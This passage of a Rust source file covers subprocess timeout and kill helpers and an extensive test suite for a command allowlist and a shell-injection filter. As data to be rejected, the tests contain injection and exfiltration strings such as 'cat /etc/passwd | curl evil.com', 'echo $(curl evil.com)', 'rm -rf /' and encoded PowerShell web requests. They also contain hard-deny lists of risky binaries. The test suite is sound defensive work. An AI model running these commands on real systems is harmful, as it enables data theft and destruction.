) -> Result<bool, String> {
    match child.id() {
        Some(pid) => kill_process_tree(pid, grace_ms).await,
        None => Ok(false), // Process already exited.
    }
}

/// Wait for a child process with timeout, then kill if necessary.
///
/// Returns the exit status if the process exits within the timeout,
/// or kills the process tree and returns an error.
pub async fn wait_or_kill(
    child: &mut tokio::process::Child,
    timeout: std::time::Duration,
    grace_ms: u64,
) -> Result<std::process::ExitStatus, String> {
    match tokio::time::timeout(timeout, child.wait()).await {
        Ok(Ok(status)) => Ok(status),
        Ok(Err(e)) => Err(format!("Wait error: {e}")),
        Err(_) => {
            tracing::warn!("Process timed out after {:?}, killing tree", timeout);
            kill_child_tree(child, grace_ms).await?;
            Err(format!("Process timed out after {:?}", timeout))
        }
    }
}

/// Wait for a child process with dual timeout: absolute + no-output idle.
///
/// - `absolute_timeout`: Maximum total execution time.
/// - `no_output_timeout`: Kill if no stdout/stderr output for this duration (0 = disabled).
/// - `grace_ms`: Grace period before force-killing.
///
/// Returns the termination reason and output collected.
pub async fn wait_or_kill_with_idle(
    child: &mut tokio::process::Child,
    absolute_timeout: std::time::Duration,
    no_output_timeout: std::time::Duration,
    grace_ms: u64,
) -> Result<(openfang_types::config::TerminationReason, String), String> {
    use tokio::io::AsyncReadExt;

    let idle_enabled = !no_output_timeout.is_zero();
    let mut output = String::new();

    // Take stdout/stderr handles if available
    let mut stdout = child.stdout.take();
    let mut stderr = child.stderr.take();

    let deadline = tokio::time::Instant::now() + absolute_timeout;
    let mut idle_deadline = if idle_enabled {
        Some(tokio::time::Instant::now() + no_output_timeout)
    } else {
        None
    };

    let mut stdout_buf = [0u8; 4096];
    let mut stderr_buf = [0u8; 4096];

    loop {
        // Check absolute timeout
        if tokio::time::Instant::now() >= deadline {
            tracing::warn!("Process hit absolute timeout after {:?}", absolute_timeout);
            kill_child_tree(child, grace_ms).await?;
            return Ok((
                openfang_types::config::TerminationReason::AbsoluteTimeout,
                output,
            ));
        }

        // Check idle timeout
        if let Some(idle_dl) = idle_deadline {
            if tokio::time::Instant::now() >= idle_dl {
                tracing::warn!(
                    "Process produced no output for {:?}, killing",
                    no_output_timeout
                );
                kill_child_tree(child, grace_ms).await?;
                return Ok((
                    openfang_types::config::TerminationReason::NoOutputTimeout,
                    output,
                ));
            }
        }

        // Use a short poll interval
        let poll_duration = std::time::Duration::from_millis(100);

        tokio::select! {
            // Try to read stdout
            result = async {
                if let Some(ref mut out) = stdout {
                    out.read(&mut stdout_buf).await
                } else {
                    // No stdout — just sleep
                    tokio::time::sleep(poll_duration).await;
                    Ok(0)
                }
            } => {
                match result {
                    Ok(0) => {
                        // EOF on stdout — process may be done
                        stdout = None;
                        if stderr.is_none() {
                            // Both closed, wait for process exit
                            match tokio::time::timeout(
                                deadline.saturating_duration_since(tokio::time::Instant::now()),
                                child.wait(),
                            ).await {
                                Ok(Ok(status)) => {
                                    return Ok((
                                        openfang_types::config::TerminationReason::Exited(status.code().unwrap_or(-1)),
                                        output,
                                    ));
                                }
                                Ok(Err(e)) => return Err(format!("Wait error: {e}")),
                                Err(_) => {
                                    kill_child_tree(child, grace_ms).await?;
                                    return Ok((openfang_types::config::TerminationReason::AbsoluteTimeout, output));
                                }
                            }
                        }
                    }
                    Ok(n) => {
                        let text = String::from_utf8_lossy(&stdout_buf[..n]);
                        output.push_str(&text);
                        // Reset idle timer on output
                        if idle_enabled {
                            idle_deadline = Some(tokio::time::Instant::now() + no_output_timeout);
                        }
                    }
                    Err(e) => {
                        tracing::debug!("Stdout read error: {e}");
                        stdout = None;
                    }
                }
            }
            // Try to read stderr
            result = async {
                if let Some(ref mut err) = stderr {
                    err.read(&mut stderr_buf).await
                } else {
                    tokio::time::sleep(poll_duration).await;
                    Ok(0)
                }
            } => {
                match result {
                    Ok(0) => {
                        stderr = None;
                    }
                    Ok(n) => {
                        let text = String::from_utf8_lossy(&stderr_buf[..n]);
                        output.push_str(&text);
                        // Reset idle timer on output
                        if idle_enabled {
                            idle_deadline = Some(tokio::time::Instant::now() + no_output_timeout);
                        }
                    }
                    Err(e) => {
                        tracing::debug!("Stderr read error: {e}");
                        stderr = None;
                    }
                }
            }
            // Process exit
            result = child.wait() => {
                match result {
                    Ok(status) => {
                        return Ok((
                            openfang_types::config::TerminationReason::Exited(status.code().unwrap_or(-1)),
                            output,
                        ));
                    }
                    Err(e) => return Err(format!("Wait error: {e}")),
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── Env passthrough merge (issue #1169) ────────────────────────────

    #[test]
    fn test_merge_env_passthrough_empty() {
        let merged = merge_env_passthrough(&[], &[]);
        assert!(merged.is_empty());
    }

    #[test]
    fn test_merge_env_passthrough_dedup() {
        let a = vec!["TZ".to_string(), "HOME".to_string()];
        let b = vec!["TZ".to_string(), "PATH".to_string()];
        let merged = merge_env_passthrough(&a, &b);
        assert_eq!(merged, vec!["TZ", "HOME", "PATH"]);
    }

    #[test]
    fn test_merge_env_passthrough_wildcard_a() {
        let merged = merge_env_passthrough(&["*".to_string()], &["TZ".to_string()]);
        assert_eq!(merged, vec!["*"]);
    }

    #[test]
    fn test_merge_env_passthrough_wildcard_b() {
        let merged = merge_env_passthrough(&["TZ".to_string()], &["*".to_string()]);
        assert_eq!(merged, vec!["*"]);
    }

    #[test]
    fn test_exec_policy_default_has_empty_passthrough() {
        let policy = openfang_types::config::ExecPolicy::default();
        assert!(policy.shell_env_passthrough.is_empty());
    }

    #[test]
    fn test_validate_path() {
        // Clean paths should be accepted.
        assert!(validate_executable_path("ls").is_ok());
        assert!(validate_executable_path("/usr/bin/python3").is_ok());
        assert!(validate_executable_path("./scripts/build.sh").is_ok());
        assert!(validate_executable_path("subdir/tool").is_ok());

        // Paths with ".." should be rejected.
        assert!(validate_executable_path("../bin/evil").is_err());
        assert!(validate_executable_path("/usr/../etc/passwd").is_err());
        assert!(validate_executable_path("foo/../../bar").is_err());
    }

    #[test]
    fn test_grace_constants() {
        assert_eq!(DEFAULT_GRACE_MS, 3000);
        assert_eq!(MAX_GRACE_MS, 60_000);
    }

    #[test]
    fn test_grace_ms_capped() {
        // Verify the capping logic used in kill_process_tree.
        let capped = 100_000u64.min(MAX_GRACE_MS);
        assert_eq!(capped, 60_000);
    }

    #[tokio::test]
    async fn test_kill_nonexistent_process() {
        // Killing a non-existent PID should not panic.
        // Use a very high PID unlikely to exist.
        let result = kill_process_tree(999_999, 100).await;
        // Result depends on platform, but must not panic.
        let _ = result;
    }

    #[tokio::test]
    async fn test_kill_child_tree_exited_process() {
        use tokio::process::Command;

        // Spawn a process that exits immediately.
        let mut child = Command::new(if cfg!(windows) { "cmd" } else { "true" })
            .args(if cfg!(windows) {
                vec!["/C", "echo done"]
            } else {
                vec![]
            })
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .expect("Failed to spawn");

        // Wait for it to finish.
        let _ = child.wait().await;

        // Now try to kill — should return Ok(false) since already exited.
        let result = kill_child_tree(&mut child, 100).await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_wait_or_kill_fast_process() {
        use tokio::process::Command;

        let mut child = Command::new(if cfg!(windows) { "cmd" } else { "true" })
            .args(if cfg!(windows) {
                vec!["/C", "echo done"]
            } else {
                vec![]
            })
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .expect("Failed to spawn");

        let result = wait_or_kill(&mut child, std::time::Duration::from_secs(5), 100).await;
        assert!(result.is_ok());
    }

    // ── Exec policy tests ──────────────────────────────────────────────

    #[test]
    fn test_extract_base_command() {
        assert_eq!(extract_base_command("ls -la"), "ls");
        assert_eq!(
            extract_base_command("/usr/bin/python3 script.py"),
            "python3"
        );
        assert_eq!(extract_base_command("  echo hello  "), "echo");
        assert_eq!(extract_base_command(""), "");
    }

    #[test]
    fn test_extract_all_commands_simple() {
        let cmds = extract_all_commands("ls -la");
        assert_eq!(cmds, vec!["ls"]);
    }

    #[test]
    fn test_extract_all_commands_piped() {
        let cmds = extract_all_commands("cat file.txt | grep foo | sort");
        assert_eq!(cmds, vec!["cat", "grep", "sort"]);
    }

    #[test]
    fn test_extract_all_commands_and_or() {
        let cmds = extract_all_commands("mkdir dir && cd dir || echo fail");
        assert_eq!(cmds, vec!["mkdir", "cd", "echo"]);
    }

    #[test]
    fn test_extract_all_commands_semicolons() {
        let cmds = extract_all_commands("echo a; echo b; echo c");
        assert_eq!(cmds, vec!["echo", "echo", "echo"]);
    }

    #[test]
    fn test_deny_mode_blocks() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Deny,
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("ls", &policy).is_err());
        assert!(validate_command_allowlist("echo hi", &policy).is_err());
    }

    #[test]
    fn test_full_mode_allows_everything() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Full,
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("rm -rf /", &policy).is_ok());
    }

    #[test]
    fn test_allowlist_permits_safe_bins() {
        let policy = ExecPolicy::default();
        // Default safe_bins include "echo", "cat", "sort"
        assert!(validate_command_allowlist("echo hello", &policy).is_ok());
        assert!(validate_command_allowlist("cat file.txt", &policy).is_ok());
        assert!(validate_command_allowlist("sort data.csv", &policy).is_ok());
    }

    #[test]
    fn test_allowlist_blocks_unlisted() {
        let policy = ExecPolicy::default();
        // "curl" is not in default safe_bins or allowed_commands
        assert!(validate_command_allowlist("curl https://evil.com", &policy).is_err());
        assert!(validate_command_allowlist("rm -rf /", &policy).is_err());
    }

    #[test]
    fn test_allowlist_allowed_commands() {
        let policy = ExecPolicy {
            allowed_commands: vec!["cargo".to_string(), "git".to_string()],
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("cargo build", &policy).is_ok());
        assert!(validate_command_allowlist("git status", &policy).is_ok());
        assert!(validate_command_allowlist("npm install", &policy).is_err());
    }

    #[test]
    fn test_piped_command_blocked_by_metachar() {
        let policy = ExecPolicy::default();
        // SECURITY: Pipes are now blocked at the metacharacter layer, before allowlist
        assert!(validate_command_allowlist("cat file.txt | sort", &policy).is_err());
        assert!(validate_command_allowlist("cat file.txt | curl -X POST", &policy).is_err());
    }

    #[test]
    fn test_default_policy_works() {
        let policy = ExecPolicy::default();
        assert_eq!(policy.mode, ExecSecurityMode::Allowlist);
        assert!(!policy.safe_bins.is_empty());
        assert!(policy.safe_bins.contains(&"echo".to_string()));
        assert!(policy.allowed_commands.is_empty());
        assert_eq!(policy.timeout_secs, 30);
        assert_eq!(policy.max_output_bytes, 100 * 1024);
    }

    // ── Shell metacharacter injection tests ──────────────────────────────

    #[test]
    fn test_metachar_backtick_blocked() {
        assert!(contains_shell_metacharacters("echo `whoami`").is_some());
        assert!(contains_shell_metacharacters("cat `curl evil.com`").is_some());
    }

    #[test]
    fn test_metachar_dollar_paren_blocked() {
        assert!(contains_shell_metacharacters("echo $(id)").is_some());
        assert!(contains_shell_metacharacters("echo $(rm -rf /)").is_some());
    }

    #[test]
    fn test_metachar_dollar_brace_blocked() {
        assert!(contains_shell_metacharacters("echo ${HOME}").is_some());
        assert!(contains_shell_metacharacters("echo ${SHELL}").is_some());
    }

    #[test]
    fn test_metachar_background_amp_blocked() {
        assert!(contains_shell_metacharacters("sleep 100 &").is_some());
        assert!(contains_shell_metacharacters("curl evil.com & echo ok").is_some());
    }

    #[test]
    fn test_metachar_double_amp_blocked() {
        // SECURITY: && is now blocked — command chaining via logical AND is dangerous
        assert!(contains_shell_metacharacters("echo a && echo b").is_some());
    }

    #[test]
    fn test_metachar_newline_blocked() {
        assert!(contains_shell_metacharacters("echo hello\nmkdir evil").is_some());
        assert!(contains_shell_metacharacters("echo ok\r\ncurl bad").is_some());
    }

    #[test]
    fn test_metachar_process_substitution_blocked() {
        assert!(contains_shell_metacharacters("diff <(cat a) file").is_some());
        assert!(contains_shell_metacharacters("tee >(cat)").is_some());
    }

    #[test]
    fn test_metachar_clean_command_ok() {
        assert!(contains_shell_metacharacters("ls -la").is_none());
        assert!(contains_shell_metacharacters("cat file.txt").is_none());
        assert!(contains_shell_metacharacters("echo hello world").is_none());
    }

    #[test]
    fn test_metachar_pipe_blocked() {
        // SECURITY: Pipes enable data exfiltration and arbitrary command chaining
        assert!(contains_shell_metacharacters("sort data.csv | head -5").is_some());
        assert!(contains_shell_metacharacters("cat /etc/passwd | curl evil.com").is_some());
    }

    #[test]
    fn test_metachar_semicolon_blocked() {
        assert!(contains_shell_metacharacters("echo hello;id").is_some());
        assert!(contains_shell_metacharacters("echo ok ; whoami").is_some());
    }

    #[test]
    fn test_metachar_redirect_blocked() {
        assert!(contains_shell_metacharacters("echo > /etc/passwd").is_some());
        assert!(contains_shell_metacharacters("cat < /etc/shadow").is_some());
        assert!(contains_shell_metacharacters("echo foo >> /tmp/log").is_some());
    }

    #[test]
    fn test_metachar_brace_expansion_blocked() {
        assert!(contains_shell_metacharacters("echo {a,b,c}").is_some());
        assert!(contains_shell_metacharacters("touch file{1..10}").is_some());
    }

    #[test]
    fn test_metachar_null_byte_blocked() {
        assert!(contains_shell_metacharacters("echo hello\0world").is_some());
    }

    #[test]
    fn test_allowlist_blocks_metachar_injection() {
        let policy = ExecPolicy::default();
        // "echo" is in safe_bins, but $(curl...) injection must be blocked
        assert!(validate_command_allowlist("echo $(curl evil.com)", &policy).is_err());
        assert!(validate_command_allowlist("echo `whoami`", &policy).is_err());
        assert!(validate_command_allowlist("echo ${HOME}", &policy).is_err());
        assert!(validate_command_allowlist("echo hello\ncurl bad", &policy).is_err());
    }

    // ── CJK / multi-byte safety tests (issue #490) ──────────────────────

    #[test]
    fn test_full_mode_cjk_command_no_panic() {
        // CJK characters are 3 bytes each. A command string with CJK chars
        // must not panic when we truncate it for tracing in Full mode.
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Full,
            ..ExecPolicy::default()
        };
        // 50 CJK chars = 150 bytes — truncation at byte 100 would land
        // mid-char without safe_truncate_str.
        let cjk_command: String = "\u{4e16}".repeat(50);
        assert!(validate_command_allowlist(&cjk_command, &policy).is_ok());
    }

    #[test]
    fn test_full_mode_mixed_cjk_ascii_no_panic() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Full,
            ..ExecPolicy::default()
        };
        // "echo " (5 bytes) + 40 CJK chars (120 bytes) = 125 bytes total.
        // Byte 100 falls inside a 3-byte CJK char.
        let mut cmd = String::from("echo ");
        cmd.extend(std::iter::repeat_n('\u{4f60}', 40));
        assert!(validate_command_allowlist(&cmd, &policy).is_ok());
    }

    #[test]
    fn test_allowlist_cjk_unlisted_no_panic() {
        let policy = ExecPolicy::default();
        // CJK command not in allowlist — should return Err, not panic
        let cjk_cmd: String = "\u{597d}".repeat(50);
        assert!(validate_command_allowlist(&cjk_cmd, &policy).is_err());
    }

    /// Regression test for GitHub issue #919.
    ///
    /// User reported that `rm /home/jcl/test/test.txt` succeeds in Allowlist
    /// mode even when `rm` is NOT in `allowed_commands`. The bypass turned out
    /// to be the `process_start` tool, which spawned subprocesses without
    /// consulting `exec_policy` at all (fixed in tool_runner.rs).
    ///
    /// This test pins down the contract on the validator itself: given the
    /// EXACT policy from the bug report, `rm /tmp/test.txt` MUST be rejected
    /// with "not in the exec allowlist" so that any future tool path which
    /// spawns subprocesses can call it and get a correct answer.
    #[test]
    fn test_issue_919_rm_blocked_when_not_in_allowlist() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["ls".to_string(), "echo".to_string()],
            ..ExecPolicy::default()
        };
        // The exact command from the bug report.
        let result = validate_command_allowlist("rm /tmp/test.txt", &policy);
        assert!(
            result.is_err(),
            "rm must be blocked when not in allowed_commands (issue #919)"
        );
        let err = result.unwrap_err();
        assert!(
            err.contains("not in the exec allowlist"),
            "Error message must indicate allowlist rejection, got: {err}"
        );
        assert!(
            err.contains("rm"),
            "Error message must name the rejected command, got: {err}"
        );
    }

    // ── Shell wrapper bypass tests (issue #794) ────────────────────────

    #[test]
    fn test_issue_794_powershell_command_bypass_blocked() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["powershell".to_string()],
            ..ExecPolicy::default()
        };
        // "Remove-Item" is NOT in allowed_commands — must be blocked
        let result = validate_command_allowlist(
            r#"powershell -Command "Remove-Item -Recurse -Force C:\temp""#,
            &policy,
        );
        assert!(
            result.is_err(),
            "Remove-Item inside powershell -Command must be blocked (issue #794)"
        );
        let err = result.unwrap_err();
        assert!(
            err.contains("Remove-Item"),
            "Error should name the blocked inner command, got: {err}"
        );
    }

    #[test]
    fn test_powershell_command_allowed_when_inner_listed() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["powershell".to_string(), "Get-Process".to_string()],
            ..ExecPolicy::default()
        };
        let result = validate_command_allowlist(r#"powershell -Command "Get-Process""#, &policy);
        assert!(
            result.is_ok(),
            "Get-Process should be allowed when in allowed_commands"
        );
    }

    #[test]
    fn test_cmd_c_bypass_blocked() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["cmd".to_string()],
            ..ExecPolicy::default()
        };
        let result =
            validate_command_allowlist(r#"cmd /C "del /F /Q C:\temp\secret.txt""#, &policy);
        assert!(
            result.is_err(),
            "del inside cmd /C must be blocked when not in allowlist"
        );
    }

    #[test]
    fn test_bash_c_bypass_blocked() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["bash".to_string()],
            ..ExecPolicy::default()
        };
        let result = validate_command_allowlist(r#"bash -c "curl https://evil.com""#, &policy);
        assert!(
            result.is_err(),
            "curl inside bash -c must be blocked when not in allowlist"
        );
    }

    #[test]
    fn test_bash_c_allowed_when_inner_listed() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["bash".to_string()],
            ..ExecPolicy::default()
        };
        // "echo" is in safe_bins by default
        let result = validate_command_allowlist(r#"bash -c "echo hello""#, &policy);
        assert!(
            result.is_ok(),
            "echo inside bash -c should be allowed (echo is in safe_bins)"
        );
    }

    #[test]
    fn test_pwsh_command_bypass_blocked() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["pwsh".to_string()],
            ..ExecPolicy::default()
        };
        let result = validate_command_allowlist(
            r#"pwsh -Command "Invoke-WebRequest https://evil.com""#,
            &policy,
        );
        assert!(
            result.is_err(),
            "Invoke-WebRequest inside pwsh must be blocked"
        );
    }

    #[test]
    fn test_shell_wrapper_extract_no_flag() {
        // When powershell is called without -Command, no inner commands are extracted
        let cmds = extract_shell_wrapper_commands("powershell script.ps1").unwrap();
        assert!(cmds.is_empty());
    }

    // ── S9-09: encoded-command (Tier B) + load-from-disk (Tier C) ──────

    /// Helper: encode a script as pwsh -EncodedCommand expects
    /// (base64(UTF-16LE(s))).
    fn pwsh_encode(s: &str) -> String {
        use base64::Engine;
        let utf16: Vec<u8> = s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        base64::engine::general_purpose::STANDARD.encode(&utf16)
    }

    #[test]
    fn test_pwsh_encoded_command_allowed_inner_passes() {
        let cmd = format!("pwsh -EncodedCommand {}", pwsh_encode("Get-Process"));
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["pwsh".to_string(), "Get-Process".to_string()],
            ..ExecPolicy::default()
        };
        assert!(
            validate_command_allowlist(&cmd, &policy).is_ok(),
            "pwsh -EncodedCommand <Get-Process> should pass when inner is allowlisted"
        );
    }

    #[test]
    fn test_pwsh_encoded_command_unlisted_inner_blocked() {
        let cmd = format!(
            "pwsh -ec {}",
            pwsh_encode("Invoke-WebRequest https://evil.com")
        );
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["pwsh".to_string()],
            ..ExecPolicy::default()
        };
        let err = validate_command_allowlist(&cmd, &policy).unwrap_err();
        assert!(
            err.contains("Invoke-WebRequest"),
            "Error should name the rejected inner command, got: {err}"
        );
    }

    #[test]
    fn test_pwsh_encoded_command_malformed_base64_rejected() {
        let cmd = "pwsh -e !!!not-base64!!!";
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["pwsh".to_string()],
            ..ExecPolicy::default()
        };
        let err = validate_command_allowlist(cmd, &policy).unwrap_err();
        assert!(
            err.to_lowercase().contains("base64") || err.contains("EncodedCommand"),
            "Error should mention base64 / EncodedCommand, got: {err}"
        );
    }

    #[test]
    fn test_pwsh_encoded_nested_within_depth_cap() {
        // Depth 2: outer pwsh -ec <b64( "pwsh -c \"Get-Process\"" )>
        let inner = pwsh_encode(r#"pwsh -c "Get-Process""#);
        let cmd = format!("pwsh -EncodedCommand {inner}");
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["pwsh".to_string(), "Get-Process".to_string()],
            ..ExecPolicy::default()
        };
        assert!(
            validate_command_allowlist(&cmd, &policy).is_ok(),
            "Depth-2 nesting (outer -ec, inner -c) within cap should pass"
        );
    }

    #[test]
    fn test_pwsh_encoded_recursion_depth_exceeded() {
        // Depth 3: pwsh -ec ( pwsh -ec ( pwsh -ec ( Get-Process ) ) ) — denied.
        let level3 = pwsh_encode("Get-Process");
        let level2 = pwsh_encode(&format!("pwsh -ec {level3}"));
        let level1 = pwsh_encode(&format!("pwsh -ec {level2}"));
        let cmd = format!("pwsh -ec {level1}");
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["pwsh".to_string(), "Get-Process".to_string()],
            ..ExecPolicy::default()
        };
        let err = validate_command_allowlist(&cmd, &policy).unwrap_err();
        assert!(
            err.contains("recursion") || err.contains("depth"),
            "Error should mention recursion/depth cap, got: {err}"
        );
    }

    #[test]
    fn test_pwsh_file_flag_denied() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["pwsh".to_string()],
            ..ExecPolicy::default()
        };
        let err = validate_command_allowlist("pwsh -File foo.ps1", &policy).unwrap_err();
        assert!(
            err.contains("-File") || err.to_lowercase().contains("load-from-disk"),
            "Error should flag -File / load-from-disk, got: {err}"
        );
    }

    #[test]
    fn test_pwsh_psconsolefile_denied() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["pwsh".to_string()],
            ..ExecPolicy::default()
        };
        assert!(
            validate_command_allowlist("pwsh -PSConsoleFile evil.psc1 -Command true", &policy)
                .is_err()
        );
    }

    #[test]
    fn test_bash_rcfile_denied() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["bash".to_string()],
            ..ExecPolicy::default()
        };
        assert!(
            validate_command_allowlist(r#"bash --rcfile /tmp/evil -c "true""#, &policy).is_err()
        );
    }

    #[test]
    fn test_bash_init_file_denied() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["bash".to_string()],
            ..ExecPolicy::default()
        };
        assert!(
            validate_command_allowlist(r#"bash --init-file /tmp/evil -c "true""#, &policy)
                .is_err()
        );
    }

    #[test]
    fn test_bash_interactive_flag_denied() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["bash".to_string()],
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist(r#"bash -i -c "echo ok""#, &policy).is_err());
    }

    #[test]
    fn test_bash_extdebug_denied() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["bash".to_string()],
            ..ExecPolicy::default()
        };
        let err =
            validate_command_allowlist(r#"bash -O extdebug -c "echo ok""#, &policy).unwrap_err();
        assert!(
            err.contains("extdebug"),
            "Error should mention extdebug, got: {err}"
        );
    }

    #[test]
    fn test_bash_plain_c_still_works_post_tier_c() {
        // Regression guard: the Tier C hard-deny must not break legitimate
        // `bash -c "<allowlisted>"` invocations.
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["bash".to_string()],
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist(r#"bash -c "echo hello""#, &policy).is_ok());
    }

    #[test]
    fn test_decode_pwsh_encoded_command_odd_length_rejected() {
        // 3 bytes of base64 -> odd payload, cannot be UTF-16LE.
        use base64::Engine;
        let odd = base64::engine::general_purpose::STANDARD.encode([0x41, 0x00, 0x42]);
        let result = decode_pwsh_encoded_command(&odd);
        assert!(result.is_err());
    }

    #[test]
    fn test_decode_pwsh_encoded_command_roundtrip() {
        let s = "Get-Process";
        let enc = pwsh_encode(s);
        let decoded = decode_pwsh_encoded_command(&enc).unwrap();
        assert_eq!(decoded, s);
    }

    #[test]
    fn test_extract_all_commands_cjk_separators() {
        // Ensure extract_all_commands handles CJK content between separators
        // without panicking (separators are ASCII, but content is CJK)
        let cmd = "\u{4f60}\u{597d}";
        let cmds = extract_all_commands(cmd);
        assert_eq!(cmds.len(), 1);
        assert_eq!(cmds[0], "\u{4f60}\u{597d}");
    }


    // ── S9-08 wrapper-binary recursion & hard-deny ─────────────────────

    fn wrapper_policy() -> ExecPolicy {
        // Allowlist mode with env/sudo/nice/nohup/timeout + a couple of
        // inner binaries allowlisted, plus shell wrappers for nested cases.
        ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec![
                "env".into(), "sudo".into(), "nice".into(), "nohup".into(),
                "timeout".into(), "ls".into(), "bash".into(), "python3".into(),
            ],
            ..ExecPolicy::default()
        }
    }

    #[test]
    fn test_s908_env_allowed_inner_passes() {
        let p = wrapper_policy();
        assert!(validate_command_allowlist("env FOO=bar ls -la", &p).is_ok());
    }

    #[test]
    fn test_s908_env_unlisted_inner_blocked() {
        let p = wrapper_policy();
        let err = validate_command_allowlist("env FOO=bar /bin/evil", &p)
            .expect_err("inner /bin/evil must be rejected");
        assert!(err.contains("evil"), "got: {err}");
    }

    #[test]
    fn test_s908_env_with_unset_flag() {
        let p = wrapper_policy();
        assert!(validate_command_allowlist("env -u HOME ls", &p).is_ok());
    }

    #[test]
    fn test_s908_env_double_dash_passes() {
        let p = wrapper_policy();
        assert!(validate_command_allowlist("env -- ls", &p).is_ok());
    }

    #[test]
    fn test_s908_sudo_unlisted_inner_blocked() {
        let p = wrapper_policy();
        let err = validate_command_allowlist("sudo /bin/evil", &p)
            .expect_err("inner /bin/evil must be rejected");
        assert!(err.contains("evil"), "got: {err}");
    }

    #[test]
    fn test_s908_sudo_with_user_flag_passes() {
        let p = wrapper_policy();
        assert!(validate_command_allowlist("sudo -u root ls", &p).is_ok());
    }

    #[test]
    fn test_s908_sudo_bash_inner_validates_inner_command() {
        let p = wrapper_policy();
        // sudo+bash allowlisted, ls allowlisted → pass.
        assert!(validate_command_allowlist("sudo bash -c \"ls\"", &p).is_ok());
        // sudo+bash allowlisted, evil NOT → reject.
        let err = validate_command_allowlist("sudo bash -c \"evil\"", &p)
            .expect_err("inner evil must be rejected");
        assert!(err.contains("evil"), "got: {err}");
    }

    #[test]
    fn test_s908_sudo_env_nested_chain() {
        let p = wrapper_policy();
        // sudo → env → ls. All allowlisted, should pass.
        assert!(validate_command_allowlist("sudo env FOO=bar ls", &p).is_ok());
        // sudo → env → evil. ls swapped to evil, must reject.
        let err = validate_command_allowlist("sudo env FOO=bar evil", &p)
            .expect_err("nested inner evil must be rejected");
        assert!(err.contains("evil"), "got: {err}");
    }

    #[test]
    fn test_s908_nice_unlisted_blocked() {
        let p = wrapper_policy();
        assert!(validate_command_allowlist("nice -n 10 evil", &p).is_err());
        assert!(validate_command_allowlist("nice -n 10 ls", &p).is_ok());
    }

    #[test]
    fn test_s908_nohup_inner_validated() {
        let p = wrapper_policy();
        assert!(validate_command_allowlist("nohup ls", &p).is_ok());
        assert!(validate_command_allowlist("nohup evil", &p).is_err());
    }

    #[test]
    fn test_s908_timeout_skips_duration() {
        let p = wrapper_policy();
        assert!(validate_command_allowlist("timeout 5s ls", &p).is_ok());
        assert!(validate_command_allowlist("timeout 5s evil", &p).is_err());
    }

    #[test]
    fn test_s908_timeout_with_signal_flag() {
        let p = wrapper_policy();
        assert!(validate_command_allowlist("timeout -s KILL 5s ls", &p).is_ok());
    }

    #[test]
    fn test_s908_xargs_hard_denied_even_if_allowlisted() {
        let p = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["xargs".into(), "ls".into()],
            ..ExecPolicy::default()
        };
        let err = validate_command_allowlist("xargs ls", &p)
            .expect_err("xargs must be hard-denied");
        assert!(err.contains("hard-denied"), "got: {err}");
    }

    #[test]
    fn test_s908_find_hard_denied() {
        let p = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["find".into()],
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("find . -name foo", &p).is_err());
    }

    #[test]
    fn test_s908_strace_hard_denied() {
        let p = wrapper_policy();
        // strace not in allowlist anyway, but ensure error message is the deny one.
        let p2 = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["strace".into(), "ls".into()],
            ..ExecPolicy::default()
        };
        let err = validate_command_allowlist("strace ls", &p2)
            .expect_err("strace must be hard-denied");
        assert!(err.contains("hard-denied"), "got: {err}");
        // Also via wrapper_policy: same outcome.
        assert!(validate_command_allowlist("strace ls", &p).is_err());
    }

    #[test]
    fn test_s908_time_chroot_unshare_setsid_stdbuf_flock_gdb_denied() {
        let p = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec![
                "time".into(), "chroot".into(), "unshare".into(), "setsid".into(),
                "stdbuf".into(), "flock".into(), "gdb".into(), "ls".into(),
            ],
